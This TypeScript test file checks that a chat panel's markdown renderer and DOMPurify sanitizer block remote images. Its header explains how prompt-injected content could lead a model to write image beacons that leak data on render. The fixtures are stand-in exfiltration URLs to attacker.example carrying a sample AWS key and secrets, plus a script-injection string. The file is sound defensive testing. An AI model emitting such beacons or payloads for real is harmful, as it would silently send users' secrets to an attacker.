/**
 * The chat panel renders markdown the MODEL wrote, and the model writes it
 * after reading attacker-reachable content — repo files, fetched pages, MCP
 * responses. Anything in that markdown that loads a remote resource on render
 * is an un-prompted outbound request carrying whatever the attacker put in the
 * URL. No click, no permission card, nothing in the diff.
 *
 * Two independent layers are pinned here:
 *
 *  1. `disableRemoteImages()` at the markdown renderer — the primary control.
 *     Pure string→string, so it behaves the same in Node, happy-dom, and the
 *     webview's Chromium.
 *  2. `FORBID_TAGS: REMOTE_CONTENT_TAGS` at the sanitizer — defense in depth,
 *     and the only thing covering raw HTML for renderers built with
 *     `html: true` (the workbench harness).
 *
 * Layer 2 is deliberately NOT the primary control. Under happy-dom 19,
 * `DOMPurify.sanitize(html, {FORBID_TAGS:['img']})` removes only the FIRST
 * matching element and leaves later siblings intact — `<p><img a></p><p><img
 * b></p><p><img c></p>` comes back still holding b and c. That is very likely a
 * happy-dom tree-traversal bug rather than a DOMPurify or Chromium one, but it
 * is exactly why the exfil control does not rest on sanitizer internals. The
 * single-element assertions in layer 2's tests below are written to pass under
 * that bug on purpose; do not "fix" them into multi-element assertions without
 * first confirming the traversal behavior of whatever DOM is in use.
 */
import { describe, it, expect } from 'vitest';
import DOMPurify from 'dompurify';
import {
  renderMarkdownToHtml,
  REMOTE_CONTENT_TAGS,
  disableRemoteImages
} from '../src/components/MarkdownMessage';
import MarkdownIt from 'markdown-it';

const PURIFY_CONFIG = {
  ADD_ATTR: ['data-file-ref', 'target', 'rel'],
  FORBID_TAGS: REMOTE_CONTENT_TAGS
};

/** Mirrors the full pipeline in MarkdownMessage and the extension webview. */
const render = (markdown: string): string =>
  DOMPurify.sanitize(renderMarkdownToHtml(markdown), PURIFY_CONFIG);

describe('layer 1 — renderer blocks remote images', () => {
  it('drops the image beacon an injected instruction would produce', () => {
    const out = render('![](https://attacker.example/pixel.png?d=AKIAIOSFODNN7EXAMPLE)');
    expect(out).not.toMatch(/<img/i);
  });

  it('covers every markdown image spelling', () => {
    for (const payload of [
      '![](https://attacker.example/a.png)',
      '![alt](https://attacker.example/b.png)',
      '![alt](https://attacker.example/c.png "title")',
      '![ref][x]\n\n[x]: https://attacker.example/d.png',
      '![](//attacker.example/proto-relative.png)',
      '![](data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=)'
    ]) {
      expect(render(payload), payload).not.toMatch(/<img/i);
    }
  });

  it('blocks EVERY image in one message, not just the first', () => {
    // The multi-element case the sanitizer layer cannot be trusted to handle.
    const many = Array.from(
      { length: 5 },
      (_, i) => `![](https://attacker.example/${i}.png?d=chunk${i})`
    ).join('\n\n');
    const out = render(many);
    expect(out).not.toMatch(/<img/i);
    expect(out.match(/bandit-blocked-image/g)).toHaveLength(5);
  });

  it('leaves the URL visible as text instead of silently deleting it', () => {
    // Reviewability: a beacon that vanishes looks identical to no beacon.
    const out = render('![logo](https://attacker.example/leak?d=secret)');
    expect(out).toContain('attacker.example/leak?d=secret');
    expect(out).toContain('logo');
  });

  it('escapes the URL it echoes back, so the block is not itself an injection', () => {
    const out = render('![](https://attacker.example/x.png"><script>alert(1)</script>)');
    expect(out).not.toContain('<script>');
  });
});

describe('layer 2 — sanitizer strips remote-loading tags', () => {
  it('strips a raw remote-loading tag (covers html:true renderers)', () => {
    // One element per assertion — see the happy-dom caveat in the file header.
    // No src/href on the fixture: FORBID_TAGS matches on tag name, and giving
    // these a URL makes happy-dom attempt a real load during parse.
    for (const tag of REMOTE_CONTENT_TAGS) {
      const raw = `<${tag}></${tag}>`;
      expect(DOMPurify.sanitize(raw, PURIFY_CONFIG).toLowerCase(), tag).not.toContain(`<${tag}`);
    }
  });

  it('strips an image tag carrying an exfil URL', () => {
    const out = DOMPurify.sanitize('<img src="https://attacker.example/x.png?d=secret">', PURIFY_CONFIG);
    expect(out).not.toMatch(/<img/i);
    expect(out).not.toContain('attacker.example');
  });

  it('strips regardless of tag casing or attribute layout', () => {
    for (const raw of [
      '<IMG SRC="https://attacker.example/x.png">',
      '<img\nsrc="https://attacker.example/x.png">',
      '<img src=https://attacker.example/x.png >'
    ]) {
      expect(DOMPurify.sanitize(raw, PURIFY_CONFIG), raw).not.toMatch(/<img/i);
    }
  });
});

describe('what the rule must not break', () => {
  it('keeps links, code, emphasis, and lists intact', () => {
    const out = render(
      ['# Title', '', 'Some **bold** and `code`.', '', '- one', '- two', '', '[docs](https://example.com)'].join('\n')
    );
    expect(out).toContain('<h1>');
    expect(out).toContain('<strong>');
    expect(out).toContain('<code>');
    expect(out).toContain('<li>');
    expect(out).toContain('href="https://example.com"');
  });

  it('keeps fenced code that happens to contain an img tag, as inert text', () => {
    const out = render(['```html', '<img src="hero.png">', '```'].join('\n'));
    expect(out).toContain('<code');
    expect(out).not.toMatch(/<img[^>]*src=/i);
    expect(out).toContain('hero.png');
  });

  it('keeps the data-file-ref attribute the click handler depends on', () => {
    const html = DOMPurify.sanitize(
      '<a data-file-ref="src/index.ts" href="#">src/index.ts</a>',
      PURIFY_CONFIG
    );
    expect(html).toContain('data-file-ref="src/index.ts"');
  });

  it('disableRemoteImages is reusable on a bare renderer (extension/workbench path)', () => {
    // The extension and workbench build their own MarkdownIt instances and
    // call the helper directly, so it has to work outside our factory.
    const md = new MarkdownIt({ html: true, linkify: true, breaks: true });
    expect(md.render('![](https://attacker.example/a.png)')).toMatch(/<img/i);
    disableRemoteImages(md);
    expect(md.render('![](https://attacker.example/a.png)')).not.toMatch(/<img/i);
  });
});
